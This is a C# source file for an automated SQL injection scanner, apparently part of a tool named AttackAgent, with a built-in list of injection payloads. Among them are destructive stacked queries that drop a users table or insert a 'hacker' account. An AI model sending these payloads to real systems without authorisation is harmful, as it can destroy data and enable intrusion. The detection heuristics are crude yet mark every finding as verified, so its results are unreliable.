using AttackAgent.Models;
using Serilog;
using System.Text.RegularExpressions;

namespace AttackAgent
{
    /// <summary>
    /// SQL Injection testing engine with comprehensive payload database
    /// Tests for various SQL injection vulnerabilities across different database types
    /// </summary>
    public class SqlInjectionEngine
    {
        private readonly SecurityHttpClient _httpClient;
        private readonly ILogger _logger;
        private readonly List<SqlInjectionPayload> _payloads;

        public SqlInjectionEngine()
        {
            _httpClient = new SecurityHttpClient();
            _logger = Log.ForContext<SqlInjectionEngine>();
            _payloads = InitializePayloads();
        }

        /// <summary>
        /// Tests all discovered endpoints for SQL injection vulnerabilities
        /// </summary>
        public async Task<List<Vulnerability>> TestForSqlInjectionAsync(ApplicationProfile profile)
        {
            var vulnerabilities = new List<Vulnerability>();
            
            _logger.Information("🔍 Starting SQL injection testing...");
            _logger.Information("Testing {EndpointCount} endpoints with {PayloadCount} payloads", 
                profile.DiscoveredEndpoints.Count, _payloads.Count);

            foreach (var endpoint in profile.DiscoveredEndpoints)
            {
                // Skip non-API endpoints for SQL injection testing
                if (!IsTestableEndpoint(endpoint))
                    continue;

                _logger.Debug("Testing endpoint: {Method} {Path}", endpoint.Method, endpoint.Path);

                var endpointVulns = await TestEndpointForSqlInjectionAsync(endpoint, profile.BaseUrl);
                vulnerabilities.AddRange(endpointVulns);
            }

            _logger.Information("SQL injection testing completed. Found {VulnCount} vulnerabilities", vulnerabilities.Count);
            return vulnerabilities;
        }

        /// <summary>
        /// Tests a specific endpoint for SQL injection vulnerabilities
        /// </summary>
        private async Task<List<Vulnerability>> TestEndpointForSqlInjectionAsync(EndpointInfo endpoint, string baseUrl)
        {
            var vulnerabilities = new List<Vulnerability>();
            var url = baseUrl.TrimEnd('/') + endpoint.Path;

            // Test each parameter with SQL injection payloads
            foreach (var parameter in endpoint.Parameters)
            {
                foreach (var payload in _payloads)
                {
                    try
                    {
                        var result = await TestParameterWithPayloadAsync(url, endpoint.Method, parameter, payload);
                        
                        if (result.IsVulnerable)
                        {
                            var vulnerability = CreateVulnerability(endpoint, parameter, payload, result);
                            vulnerabilities.Add(vulnerability);
                            
                            _logger.Warning("🚨 SQL Injection found: {Method} {Path} parameter '{Parameter}' with payload '{Payload}'", 
                                endpoint.Method, endpoint.Path, parameter.Name, payload.Payload);
                        }
                    }
                    catch (Exception ex)
                    {
                        _logger.Debug("Error testing {Parameter} with payload {Payload}: {Error}", 
                            parameter.Name, payload.Payload, ex.Message);
                    }
                }
            }

            // If no parameters found, test with common parameter names
            if (!endpoint.Parameters.Any())
            {
                var commonParams = new[] { "id", "user", "search", "query", "filter", "sort", "limit", "offset" };
                
                foreach (var paramName in commonParams)
                {
                    foreach (var payload in _payloads.Take(5)) // Test with top 5 payloads
                    {
                        try
                        {
                            var result = await TestParameterWithPayloadAsync(url, endpoint.Method, 
                                new ParameterInfo { Name = paramName, Location = ParameterLocation.Query }, payload);
                            
                            if (result.IsVulnerable)
                            {
                                var vulnerability = CreateVulnerability(endpoint, 
                                    new ParameterInfo { Name = paramName, Location = ParameterLocation.Query }, payload, result);
                                vulnerabilities.Add(vulnerability);
                                
                                _logger.Warning("🚨 SQL Injection found: {Method} {Path} parameter '{Parameter}' with payload '{Payload}'", 
                                    endpoint.Method, endpoint.Path, paramName, payload.Payload);
                            }
                        }
                        catch (Exception ex)
                        {
                            _logger.Debug("Error testing {Parameter} with payload {Payload}: {Error}", 
                                paramName, payload.Payload, ex.Message);
                        }
                    }
                }
            }

            return vulnerabilities;
        }

        /// <summary>
        /// Tests a specific parameter with a SQL injection payload
        /// </summary>
        private async Task<SqlInjectionResult> TestParameterWithPayloadAsync(string url, string method, 
            ParameterInfo parameter, SqlInjectionPayload payload)
        {
            var result = new SqlInjectionResult
            {
                Payload = payload,
                Parameter = parameter,
                IsVulnerable = false
            };

            try
            {
                // Get baseline response
                var baselineResponse = await GetBaselineResponseAsync(url, method);
                result.BaselineResponse = baselineResponse;

                // Test with payload
                var payloadResponse = await SendPayloadAsync(url, method, parameter, payload);
                result.PayloadResponse = payloadResponse;

                // Analyze response for SQL injection indicators
                result.IsVulnerable = AnalyzeResponseForSqlInjection(baselineResponse, payloadResponse, payload);

                if (result.IsVulnerable)
                {
                    result.Confidence = CalculateConfidence(baselineResponse, payloadResponse, payload);
                    result.Evidence = ExtractEvidence(payloadResponse, payload);
                }
            }
            catch (Exception ex)
            {
                _logger.Debug("Error in SQL injection test: {Error}", ex.Message);
            }

            return result;
        }

        /// <summary>
        /// Gets baseline response without payload
        /// </summary>
        private async Task<HttpResponse> GetBaselineResponseAsync(string url, string method)
        {
            return method.ToUpper() switch
            {
                "GET" => await _httpClient.GetAsync(url),
                "POST" => await _httpClient.PostAsync(url, "{}"),
                "PUT" => await _httpClient.PutAsync(url, "{}"),
                "DELETE" => await _httpClient.DeleteAsync(url),
                _ => await _httpClient.GetAsync(url)
            };
        }

        /// <summary>
        /// Sends payload to the target parameter
        /// </summary>
        private async Task<HttpResponse> SendPayloadAsync(string url, string method, 
            ParameterInfo parameter, SqlInjectionPayload payload)
        {
            switch (parameter.Location)
            {
                case ParameterLocation.Query:
                    return await SendQueryParameterPayloadAsync(url, method, parameter, payload);
                case ParameterLocation.Body:
                    return await SendBodyParameterPayloadAsync(url, method, parameter, payload);
                case ParameterLocation.Header:
                    return await SendHeaderParameterPayloadAsync(url, method, parameter, payload);
                default:
                    return await SendQueryParameterPayloadAsync(url, method, parameter, payload);
            }
        }

        /// <summary>
        /// Sends payload as query parameter
        /// </summary>
        private async Task<HttpResponse> SendQueryParameterPayloadAsync(string url, string method, 
            ParameterInfo parameter, SqlInjectionPayload payload)
        {
            var separator = url.Contains('?') ? "&" : "?";
            var payloadUrl = $"{url}{separator}{parameter.Name}={Uri.EscapeDataString(payload.Payload)}";

            return method.ToUpper() switch
            {
                "GET" => await _httpClient.GetAsync(payloadUrl),
                "POST" => await _httpClient.PostAsync(payloadUrl, "{}"),
                "PUT" => await _httpClient.PutAsync(payloadUrl, "{}"),
                "DELETE" => await _httpClient.DeleteAsync(payloadUrl),
                _ => await _httpClient.GetAsync(payloadUrl)
            };
        }

        /// <summary>
        /// Sends payload as body parameter
        /// </summary>
        private async Task<HttpResponse> SendBodyParameterPayloadAsync(string url, string method, 
            ParameterInfo parameter, SqlInjectionPayload payload)
        {
            var body = $"{{\"{parameter.Name}\": \"{payload.Payload.Replace("\"", "\\\"")}\"}}";
            
            return method.ToUpper() switch
            {
                "POST" => await _httpClient.PostAsync(url, body),
                "PUT" => await _httpClient.PutAsync(url, body),
                _ => await _httpClient.PostAsync(url, body)
            };
        }

        /// <summary>
        /// Sends payload as header parameter
        /// </summary>
        private async Task<HttpResponse> SendHeaderParameterPayloadAsync(string url, string method, 
            ParameterInfo parameter, SqlInjectionPayload payload)
        {
            var headers = new Dictionary<string, string>
            {
                { parameter.Name, payload.Payload }
            };

            return method.ToUpper() switch
            {
                "GET" => await _httpClient.GetAsync(url, headers),
                "POST" => await _httpClient.PostAsync(url, "{}", headers),
                "PUT" => await _httpClient.PutAsync(url, "{}", headers),
                "DELETE" => await _httpClient.DeleteAsync(url, headers),
                _ => await _httpClient.GetAsync(url, headers)
            };
        }

        /// <summary>
        /// Analyzes response for SQL injection indicators
        /// </summary>
        private bool AnalyzeResponseForSqlInjection(HttpResponse baseline, HttpResponse payload, SqlInjectionPayload sqlPayload)
        {
            // Check for SQL error messages
            if (ContainsSqlError(payload.Content))
                return true;

            // Check for time-based blind SQL injection
            if (sqlPayload.Type == SqlInjectionType.TimeBased && IsTimeBasedVulnerability(baseline, payload))
                return true;

            // Check for boolean-based blind SQL injection
            if (sqlPayload.Type == SqlInjectionType.BooleanBased && IsBooleanBasedVulnerability(baseline, payload))
                return true;

            // Check for union-based SQL injection
            if (sqlPayload.Type == SqlInjectionType.UnionBased && IsUnionBasedVulnerability(payload))
                return true;

            // Check for error-based SQL injection
            if (sqlPayload.Type == SqlInjectionType.ErrorBased && IsErrorBasedVulnerability(baseline, payload))
                return true;

            return false;
        }

        /// <summary>
        /// Checks if response contains SQL error messages
        /// </summary>
        private bool ContainsSqlError(string content)
        {
            var sqlErrors = new[]
            {
                "sql syntax",
                "mysql_fetch",
                "ORA-01756",
                "Microsoft OLE DB Provider for ODBC Drivers",
                "Microsoft OLE DB Provider for SQL Server",
                "Incorrect syntax near",
                "Unclosed quotation mark",
                "quoted string not properly terminated",
                "sql server",
                "mysql error",
                "postgresql error",
                "sqlite error",
                "database error",
                "sql exception",
                "syntax error",
                "invalid column name",
                "invalid object name",
                "table doesn't exist",
                "column doesn't exist"
            };

            var lowerContent = content.ToLower();
            return sqlErrors.Any(error => lowerContent.Contains(error));
        }

        /// <summary>
        /// Checks for time-based blind SQL injection
        /// </summary>
        private bool IsTimeBasedVulnerability(HttpResponse baseline, HttpResponse payload)
        {
            // Time-based SQL injection typically causes significant delay
            var timeDifference = payload.ResponseTime.TotalMilliseconds - baseline.ResponseTime.TotalMilliseconds;
            return timeDifference > 4000; // 4 second delay indicates time-based injection
        }

        /// <summary>
        /// Checks for boolean-based blind SQL injection
        /// </summary>
        private bool IsBooleanBasedVulnerability(HttpResponse baseline, HttpResponse payload)
        {
            // Boolean-based injection causes different response lengths or status codes
            var lengthDifference = Math.Abs(payload.ContentLength - baseline.ContentLength);
            var statusCodeDifferent = payload.StatusCode != baseline.StatusCode;
            
            return lengthDifference > 100 || statusCodeDifferent;
        }

        /// <summary>
        /// Checks for union-based SQL injection
        /// </summary>
        private bool IsUnionBasedVulnerability(HttpResponse payload)
        {
            // Union-based injection often returns additional data
            return payload.Content.Contains("union") || 
                   payload.Content.Contains("select") ||
                   payload.ContentLength > 1000; // Large response might indicate union injection
        }

        /// <summary>
        /// Checks for error-based SQL injection
        /// </summary>
        private bool IsErrorBasedVulnerability(HttpResponse baseline, HttpResponse payload)
        {
            // Error-based injection causes different error responses
            return payload.StatusCode == System.Net.HttpStatusCode.InternalServerError ||
                   payload.Content.Contains("error") ||
                   payload.Content.Contains("exception");
        }

        /// <summary>
        /// Calculates confidence level for the vulnerability
        /// </summary>
        private double CalculateConfidence(HttpResponse baseline, HttpResponse payload, SqlInjectionPayload sqlPayload)
        {
            var confidence = 0.0;

            // High confidence for SQL error messages
            if (ContainsSqlError(payload.Content))
                confidence += 0.8;

            // Medium confidence for time-based injection
            if (sqlPayload.Type == SqlInjectionType.TimeBased && IsTimeBasedVulnerability(baseline, payload))
                confidence += 0.7;

            // Medium confidence for boolean-based injection
            if (sqlPayload.Type == SqlInjectionType.BooleanBased && IsBooleanBasedVulnerability(baseline, payload))
                confidence += 0.6;

            // High confidence for union-based injection
            if (sqlPayload.Type == SqlInjectionType.UnionBased && IsUnionBasedVulnerability(payload))
                confidence += 0.8;

            return Math.Min(confidence, 1.0);
        }

        /// <summary>
        /// Extracts evidence from the response
        /// </summary>
        private string ExtractEvidence(HttpResponse response, SqlInjectionPayload payload)
        {
            var evidence = new List<string>();

            if (ContainsSqlError(response.Content))
            {
                evidence.Add("SQL error message detected in response");
            }

            if (response.StatusCode == System.Net.HttpStatusCode.InternalServerError)
            {
                evidence.Add("Internal server error returned");
            }

            if (response.ResponseTime.TotalSeconds > 5)
            {
                evidence.Add($"Response time delay: {response.ResponseTime.TotalSeconds:F2} seconds");
            }

            return string.Join("; ", evidence);
        }

        /// <summary>
        /// Creates a vulnerability object from the test result
        /// </summary>
        private Vulnerability CreateVulnerability(EndpointInfo endpoint, ParameterInfo parameter, 
            SqlInjectionPayload payload, SqlInjectionResult result)
        {
            return new Vulnerability
            {
                Type = VulnerabilityType.SqlInjection,
                Severity = DetermineSeverity(payload, result),
                Title = $"SQL Injection in {parameter.Name}",
                Description = $"SQL injection vulnerability found in {parameter.Name} parameter using {payload.Type} technique.",
                Endpoint = endpoint.Path,
                Method = endpoint.Method,
                Parameter = parameter.Name,
                Payload = payload.Payload,
                Response = result.PayloadResponse?.Content,
                Evidence = result.Evidence,
                Remediation = "🔒 RECOMMENDED FIX: Use SqlCommand.Parameters.AddWithValue() for secure SQL injection prevention.\n\n" +
                             "❌ VULNERABLE CODE:\n" +
                             "string sql = \"SELECT * FROM Users WHERE Username = '\" + username + \"'\";\n" +
                             "SqlCommand command = new SqlCommand(sql, connection);\n\n" +
                             "✅ SECURE CODE:\n" +
                             "string sql = \"SELECT * FROM Users WHERE Username = @Username\";\n" +
                             "SqlCommand command = new SqlCommand(sql, connection);\n" +
                             "command.Parameters.AddWithValue(\"@Username\", username);\n\n" +
                             "📋 ADDITIONAL MEASURES:\n" +
                             "• Use parameterized queries for ALL database operations\n" +
                             "• Validate and sanitize all user input\n" +
                             "• Use Entity Framework or other ORMs that handle SQL injection automatically\n" +
                             "• Implement proper input validation and output encoding\n" +
                             "• Follow the principle of least privilege for database access",
                AttackMode = AttackMode.Aggressive,
                Confidence = result.Confidence,
                Verified = true
            };
        }

        /// <summary>
        /// Determines severity based on payload type and confidence
        /// </summary>
        private SeverityLevel DetermineSeverity(SqlInjectionPayload payload, SqlInjectionResult result)
        {
            if (result.Confidence >= 0.8)
                return SeverityLevel.Critical;
            else if (result.Confidence >= 0.6)
                return SeverityLevel.High;
            else if (result.Confidence >= 0.4)
                return SeverityLevel.Medium;
            else
                return SeverityLevel.Low;
        }

        /// <summary>
        /// Determines severity based on confidence level
        /// </summary>
        private SeverityLevel DetermineSeverity(double confidence)
        {
            if (confidence >= 0.9) return SeverityLevel.Critical;
            if (confidence >= 0.7) return SeverityLevel.High;
            if (confidence >= 0.5) return SeverityLevel.Medium;
            return SeverityLevel.Low;
        }

        /// <summary>
        /// Gets remediation advice for the vulnerability
        /// </summary>
        private string GetRemediation(SqlInjectionPayload payload)
        {
            return "🔒 RECOMMENDED FIX: Use SqlCommand.Parameters.AddWithValue() for secure SQL injection prevention.\n\n" +
                   "❌ VULNERABLE CODE:\n" +
                   "string sql = \"SELECT * FROM Users WHERE Username = '\" + username + \"'\";\n" +
                   "SqlCommand command = new SqlCommand(sql, connection);\n\n" +
                   "✅ SECURE CODE:\n" +
                   "string sql = \"SELECT * FROM Users WHERE Username = @Username\";\n" +
                   "SqlCommand command = new SqlCommand(sql, connection);\n" +
                   "command.Parameters.AddWithValue(\"@Username\", username);\n\n" +
                   "📋 ADDITIONAL MEASURES:\n" +
                   "• Use parameterized queries for ALL database operations\n" +
                   "• Validate and sanitize all user input\n" +
                   "• Use Entity Framework or other ORMs that handle SQL injection automatically\n" +
                   "• Implement proper input validation and output encoding\n" +
                   "• Follow the principle of least privilege for database access";
        }

        /// <summary>
        /// Checks if endpoint is suitable for SQL injection testing
        /// </summary>
        private bool IsTestableEndpoint(EndpointInfo endpoint)
        {
            // Test API endpoints and endpoints that might accept parameters
            return endpoint.Path.Contains("/api/") || 
                   endpoint.Path.Contains("search") ||
                   endpoint.Path.Contains("query") ||
                   endpoint.Path.Contains("filter") ||
                   endpoint.Method == "POST" ||
                   endpoint.Method == "PUT";
        }

        /// <summary>
        /// Initializes comprehensive SQL injection payload database
        /// </summary>
        private List<SqlInjectionPayload> InitializePayloads()
        {
            return new List<SqlInjectionPayload>
            {
                // Error-based SQL injection payloads
                new SqlInjectionPayload { Payload = "'", Type = SqlInjectionType.ErrorBased, Database = "All", Description = "Single quote to trigger SQL error" },
                new SqlInjectionPayload { Payload = "\"", Type = SqlInjectionType.ErrorBased, Database = "All", Description = "Double quote to trigger SQL error" },
                new SqlInjectionPayload { Payload = "';", Type = SqlInjectionType.ErrorBased, Database = "All", Description = "Quote with semicolon" },
                new SqlInjectionPayload { Payload = "\";", Type = SqlInjectionType.ErrorBased, Database = "All", Description = "Double quote with semicolon" },
                new SqlInjectionPayload { Payload = "' OR '1'='1", Type = SqlInjectionType.BooleanBased, Database = "All", Description = "Classic OR injection" },
                new SqlInjectionPayload { Payload = "' OR 1=1--", Type = SqlInjectionType.BooleanBased, Database = "SQL Server", Description = "SQL Server OR injection" },
                new SqlInjectionPayload { Payload = "' OR 1=1#", Type = SqlInjectionType.BooleanBased, Database = "MySQL", Description = "MySQL OR injection" },
                new SqlInjectionPayload { Payload = "' OR 1=1/*", Type = SqlInjectionType.BooleanBased, Database = "Oracle", Description = "Oracle OR injection" },

                // Union-based SQL injection payloads
                new SqlInjectionPayload { Payload = "' UNION SELECT NULL--", Type = SqlInjectionType.UnionBased, Database = "SQL Server", Description = "SQL Server UNION injection" },
                new SqlInjectionPayload { Payload = "' UNION SELECT NULL#", Type = SqlInjectionType.UnionBased, Database = "MySQL", Description = "MySQL UNION injection" },
                new SqlInjectionPayload { Payload = "' UNION SELECT NULL FROM DUAL--", Type = SqlInjectionType.UnionBased, Database = "Oracle", Description = "Oracle UNION injection" },
                new SqlInjectionPayload { Payload = "' UNION SELECT 1,2,3,4,5--", Type = SqlInjectionType.UnionBased, Database = "SQL Server", Description = "SQL Server UNION with columns" },
                new SqlInjectionPayload { Payload = "' UNION SELECT 1,2,3,4,5#", Type = SqlInjectionType.UnionBased, Database = "MySQL", Description = "MySQL UNION with columns" },

                // Time-based blind SQL injection payloads
                new SqlInjectionPayload { Payload = "'; WAITFOR DELAY '00:00:05'--", Type = SqlInjectionType.TimeBased, Database = "SQL Server", Description = "SQL Server time delay" },
                new SqlInjectionPayload { Payload = "'; SELECT SLEEP(5)--", Type = SqlInjectionType.TimeBased, Database = "MySQL", Description = "MySQL time delay" },
                new SqlInjectionPayload { Payload = "'; SELECT pg_sleep(5)--", Type = SqlInjectionType.TimeBased, Database = "PostgreSQL", Description = "PostgreSQL time delay" },
                new SqlInjectionPayload { Payload = "'; SELECT DBMS_LOCK.SLEEP(5) FROM DUAL--", Type = SqlInjectionType.TimeBased, Database = "Oracle", Description = "Oracle time delay" },

                // Stacked queries
                new SqlInjectionPayload { Payload = "'; DROP TABLE users--", Type = SqlInjectionType.Stacked, Database = "SQL Server", Description = "Stacked query example" },
                new SqlInjectionPayload { Payload = "'; INSERT INTO users VALUES ('hacker', 'password')--", Type = SqlInjectionType.Stacked, Database = "SQL Server", Description = "Stacked INSERT query" },

                // Advanced payloads
                new SqlInjectionPayload { Payload = "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--", Type = SqlInjectionType.BooleanBased, Database = "MySQL", Description = "MySQL information schema test" },
                new SqlInjectionPayload { Payload = "' AND (SELECT COUNT(*) FROM sysobjects)>0--", Type = SqlInjectionType.BooleanBased, Database = "SQL Server", Description = "SQL Server system tables test" },
                new SqlInjectionPayload { Payload = "' AND (SELECT COUNT(*) FROM all_tables)>0--", Type = SqlInjectionType.BooleanBased, Database = "Oracle", Description = "Oracle system tables test" },

                // NoSQL injection payloads
                new SqlInjectionPayload { Payload = "{\"$ne\": null}", Type = SqlInjectionType.NoSql, Database = "MongoDB", Description = "MongoDB not equal injection" },
                new SqlInjectionPayload { Payload = "{\"$gt\": \"\"}", Type = SqlInjectionType.NoSql, Database = "MongoDB", Description = "MongoDB greater than injection" },
                new SqlInjectionPayload { Payload = "{\"$where\": \"this.password == this.username\"}", Type = SqlInjectionType.NoSql, Database = "MongoDB", Description = "MongoDB $where injection" }
            };
        }

        public void Dispose()
        {
            _httpClient?.Dispose();
        }
    }

    /// <summary>
    /// SQL injection payload definition
    /// </summary>
    public class SqlInjectionPayload
    {
        public string Payload { get; set; } = string.Empty;
        public SqlInjectionType Type { get; set; }
        public string Database { get; set; } = string.Empty;
        public string Description { get; set; } = string.Empty;
        public double SuccessRate { get; set; } = 0.0;
    }

    /// <summary>
    /// Types of SQL injection attacks
    /// </summary>
    public enum SqlInjectionType
    {
        ErrorBased,
        BooleanBased,
        UnionBased,
        TimeBased,
        Stacked,
        NoSql
    }

    /// <summary>
    /// Result of SQL injection test
    /// </summary>
    public class SqlInjectionResult
    {
        public SqlInjectionPayload Payload { get; set; } = new();
        public ParameterInfo Parameter { get; set; } = new();
        public bool IsVulnerable { get; set; }
        public double Confidence { get; set; }
        public string Evidence { get; set; } = string.Empty;
        public HttpResponse? BaselineResponse { get; set; }
        public HttpResponse? PayloadResponse { get; set; }
    }
}

